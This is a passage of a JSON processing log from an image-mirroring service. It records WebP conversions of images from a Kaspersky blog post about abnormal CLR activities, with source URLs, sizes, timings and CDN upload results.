KB","compressRate":"100.9%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203334/Abnormal_CLR_activities_02.png","sourceStatusCode":200,"destWidth":500,"destHeight":129,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn7@2020_6/2021/09/28/11-37-29-212_7363e91d4fbb6897.webp","sourceBytes":7562,"destBytes":12494,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":629,"convertSpendMs":12,"createdTime":"2021-09-28 19:37:28","host":"us-008*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.4 KB","destSize":"12.2 KB","compressRate":"165.2%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203700/Abnormal_CLR_activities_06.png","sourceStatusCode":200,"destWidth":283,"destHeight":151,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn19@2020_1/2021/09/28/11-37-29-392_c6a51f17acad0c1c.webp","sourceBytes":6677,"destBytes":11676,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":709,"convertSpendMs":4,"createdTime":"2021-09-28 19:37:28","host":"us-51*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.5 KB","destSize":"11.4 KB","compressRate":"174.9%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205904/Abnormal_CLR_activities_23.png","sourceStatusCode":200,"destWidth":610,"destHeight":437,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn32@2020_1/2021/09/28/11-37-29-210_e37c771c80ff7fcb.webp","sourceBytes":32508,"destBytes":15306,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":914,"convertSpendMs":12,"createdTime":"2021-09-28 19:37:28","host":"europe-57*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.7 KB","destSize":"14.9 KB","compressRate":"47.1%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205921/Abnormal_CLR_activities_24-1024x138.png","sourceStatusCode":200,"destWidth":1024,"destHeight":138,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn45@2020_1/2021/09/28/11-37-29-276_ca3d30459dbbdd43.webp","sourceBytes":66615,"destBytes":6346,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1002,"convertSpendMs":227,"createdTime":"2021-09-28 19:37:28","host":"europe61*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"65.1 KB","destSize":"6.2 KB","compressRate":"9.5%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204145/Abnormal_CLR_activities_12.png","sourceStatusCode":200,"destWidth":781,"destHeight":105,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn9@2020_5/2021/09/28/11-37-29-055_777561d478825405.webp","sourceBytes":59043,"destBytes":5172,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":969,"convertSpendMs":16,"createdTime":"2021-09-28 19:37:28","host":"us-038*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"57.7 KB","destSize":"5.1 KB","compressRate":"8.8%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205553/Abnormal_CLR_activities_17-1024x290.png","sourceStatusCode":200,"destWidth":1024,"destHeight":290,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn21@2020_4/2021/09/28/11-37-29-639_f592530a12a60db0.webp","sourceBytes":287941,"destBytes":21384,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1003,"convertSpendMs":45,"createdTime":"2021-09-28 19:37:28","host":"us-52*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"281.2 KB","destSize":"20.9 KB","compressRate":"7.4%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205646/Abnormal_CLR_activities_19.png","sourceStatusCode":200,"destWidth":750,"destHeight":828,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn15@2020_4/2021/09/28/11-37-29-791_91b74e536ac05590.webp","sourceBytes":582253,"destBytes":41816,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1121,"convertSpendMs":72,"createdTime":"2021-09-28 19:37:28","host":"us-039*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"568.6 KB","destSize":"40.8 KB","compressRate":"7.2%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205444/Abnormal_CLR_activities_14.png","sourceStatusCode":200,"destWidth":888,"destHeight":750,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn57@2020_6/2021/09/28/11-37-31-390_2089f33f5605183d.webp","sourceBytes":696277,"destBytes":48320,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1176,"convertSpendMs":33,"createdTime":"2021-09-28 19:37:30","host":"europe-56*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"680 KB","destSize":"47.2 KB","compressRate":"6.9%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203408/Abnormal_CLR_activities_03.jpeg","sourceStatusCode":200,"destWidth":720,"destHeight":526,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn30@2020_6/2021/09/28/11-37-31-332_7e55f6d18eddb366.webp","sourceBytes":84010,"destBytes":28774,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1176,"convertSpendMs":17,"createdTime":"2021-09-28 19:37:30","host":"europe-56*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"82 KB","destSize":"28.1 KB","compressRate":"34.3%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203713/Abnormal_CLR_activities_07.png","sourceStatusCode":200,"destWidth":393,"destHeight":364,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn54@2020_3/2021/09/28/11-37-31-333_33638c6fc303af3b.webp","sourceBytes":22231,"destBytes":31644,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1317,"convertSpendMs":19,"createdTime":"2021-09-28 19:37:30","host":"europe65*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"21.7 KB","destSize":"30.9 KB","compressRate":"142.3%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205531/Abnormal_CLR_activities_16.png","sourceStatusCode":200,"destWidth":676,"destHeight":94,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn56@2020_6/2021/09/28/11-37-39-873_95ef348c3cff4a27.webp","sourceBytes":84546,"destBytes":6082,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":1929,"convertSpendMs":590,"createdTime":"2021-09-28 19:37:38","host":"europe66*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"82.6 KB","destSize":"5.9 KB","compressRate":"7.2%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20210201/Abnormal_CLR_activities_25-1024x53.png","sourceStatusCode":200,"destWidth":1024,"destHeight":53,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn24@2020_4/2021/09/28/11-37-45-502_502a6eaabe070513.webp","sourceBytes":28859,"destBytes":5906,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":903,"convertSpendMs":6,"createdTime":"2021-09-28 19:37:44","host":"us-53*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"28.2 KB","destSize":"5.8 KB","compressRate":"20.5%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203239/Abnormal_CLR_activities_ru_01.png","sourceStatusCode":200,"destWidth":552,"destHeight":487,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn12@2020_1/2021/09/28/11-37-47-154_ca0ed0131d2fe2ef.webp","sourceBytes":46531,"destBytes":22540,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":738,"convertSpendMs":15,"createdTime":"2021-09-28 19:37:47","host":"us-034*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45.4 KB","destSize":"22 KB","compressRate":"48.4%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20205506/Abnormal_CLR_activities_15-1024x83.png","sourceStatusCode":200,"destWidth":1024,"destHeight":83,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn25@2020_2/2021/09/28/11-37-47-318_d6dc87e907baf7fc.webp","sourceBytes":90344,"destBytes":7450,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":546,"convertSpendMs":8,"createdTime":"2021-09-28 19:37:47","host":"us-54*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"88.2 KB","destSize":"7.3 KB","compressRate":"8.2%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203725/Abnormal_CLR_activities_08.png","sourceStatusCode":200,"destWidth":329,"destHeight":220,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn49@2020_6/2021/09/28/11-37-49-383_6c8d5afcb95bf5a8.webp","sourceBytes":11184,"destBytes":18374,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":710,"convertSpendMs":12,"createdTime":"2021-09-28 19:37:49","host":"europe63*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"10.9 KB","destSize":"17.9 KB","compressRate":"164.3%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204208/Abnormal_CLR_activities_13-1024x564.png","sourceStatusCode":200,"destWidth":1024,"destHeight":564,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn47@2020_5/2021/09/28/11-37-49-675_287ada46f2a94aa7.webp","sourceBytes":123094,"destBytes":6152,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":784,"convertSpendMs":34,"createdTime":"2021-09-28 19:37:49","host":"europe62*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"120.2 KB","destSize":"6 KB","compressRate":"5%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20203625/Abnormal_CLR_activities_05-2.png","sourceStatusCode":200,"destWidth":706,"destHeight":388,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn37@2020_2/2021/09/28/11-37-49-670_ef896b2c29112470.webp","sourceBytes":37572,"destBytes":45286,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":883,"convertSpendMs":77,"createdTime":"2021-09-28 19:37:49","host":"europe-60*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36.7 KB","destSize":"44.2 KB","compressRate":"120.5%"},{"code":1,"isDone":false,"source":"https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2021/09/20204133/Abnormal_CLR_activities_11.png","sourceStatusCode":200,"destWidth":560,"destHeight":76,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn51@2020_5/2021/09/28/11-37-51-512_593b4af1dffbbb8d.webp","sourceBytes":54468,"destBytes":4248,"targetWebpQuality":75,"feedId":36099,"totalSpendMs":932,"convertSpendMs":22,"createdTime":"2021-09-28 19:37:51","host":"europe64*","referer":"https://kasperskycontenthub.com/securelist-russia/?p=103633","linkMd5ListStr":"c6f285a7c89a5cf403cee776896d9144","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"53.2 KB","destSize":"4.1 KB","compressRate":"7.8%"}],"successGithubMap":{"myreaderx14":1,"myreaderx15":1,"myreaderx7":1,"myreaderx16":1,"myreaderx6":1,"myreaderx10":1,"myreaderx4":1,"myreaderx32":1,"myreaderx3":1,"myreaderx11":1,"myreaderx33":1,"myreaderx2":1,"myreaderx12":1,"myreaderx1":1,"myreaderx13":1,"myreaderx30":1,"myreaderx31":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx23":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{}}